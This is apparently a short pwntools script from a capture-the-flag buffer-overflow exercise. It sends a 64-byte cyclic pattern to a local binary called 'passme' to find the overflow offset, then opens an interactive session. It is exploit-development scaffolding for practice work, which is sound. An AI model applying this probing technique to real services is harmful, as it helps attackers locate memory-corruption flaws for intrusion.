from pwn import*
p = process("./passme")
payload= cyclic(64)  
p.sendlineafter(b"name: \n",payload)
p.interactive() 
